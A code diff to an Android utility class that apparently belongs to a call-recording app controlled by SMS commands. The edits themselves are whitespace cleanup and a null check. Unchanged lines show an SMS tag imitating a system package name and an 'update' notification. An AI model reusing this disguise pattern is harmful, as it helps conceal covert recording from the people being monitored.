@@ -35,7 +35,7 @@ public class Utils {
 	public static final int STATE_OUT_NUMBER = 1;
 	public static final int STATE_CALL_START = 2;
 	public static final int STATE_CALL_END = 3;
-	
+
 	public static final int COMMAND_REC_START = 1;
 	public static final int COMMAND_REC_STOP = 2;
 
@@ -48,7 +48,7 @@ public class Utils {
 	public static final int MEDIA_MOUNTED_READ_ONLY = 1;
 	public static final int NO_MEDIA = 2;
 
-	public static final String EXTRA_SMS_BODY = "smsbody";	
+	public static final String EXTRA_SMS_BODY = "smsbody";
 	public static final String IDENT_SMS = "#com.telephony.services";
 	public static final String CONFIG_OUT_FILENAME = "config.out";
 
@@ -167,22 +167,24 @@ public class Utils {
 	 */
 	public static String getContactName(Context context, String phoneNum) {
 		String res = phoneNum;
-		Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNum));
-		String[] projection = new String[] { PhoneLookup.DISPLAY_NAME };
+		if (phoneNum != null) {
+			Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNum));
+			String[] projection = new String[] { PhoneLookup.DISPLAY_NAME };
 
-		Cursor names = context.getContentResolver().query(uri, projection, null, null, null);
-		try {
-			int indexName = names.getColumnIndex(PhoneLookup.DISPLAY_NAME);
-			if (names.getCount() > 0) {
-				names.moveToFirst();
-				do {
-					String name = names.getString(indexName);
-					res = name;
-				} while (names.moveToNext());
+			Cursor names = context.getContentResolver().query(uri, projection, null, null, null);
+			try {
+				int indexName = names.getColumnIndex(PhoneLookup.DISPLAY_NAME);
+				if (names.getCount() > 0) {
+					names.moveToFirst();
+					do {
+						String name = names.getString(indexName);
+						res = name;
+					} while (names.moveToNext());
+				}
+			} finally {
+				names.close();
+				names = null;
 			}
-		} finally {
-			names.close();
-			names = null;
 		}
 		return res;
 	}
@@ -190,8 +192,7 @@ public class Utils {
 	public static void show_notification(Context context, int mId, String subtext, Intent intent) {
 		NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(context).setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
 				.setContentTitle(context.getResources().getString(R.string.update_title))
-				.setContentText(context.getResources().getString(R.string.update_text))
-				.setSubText(subtext).setAutoCancel(true);
+				.setContentText(context.getResources().getString(R.string.update_text)).setSubText(subtext).setAutoCancel(true);
 
 		PendingIntent pi = PendingIntent.getActivity(context, 0, intent, Intent.FLAG_ACTIVITY_NEW_TASK);
 		mBuilder.setContentIntent(pi);
@@ -249,5 +250,7 @@ public class Utils {
 			file.renameTo(new_file);
 		}
 	}
+	
+	
 
 }
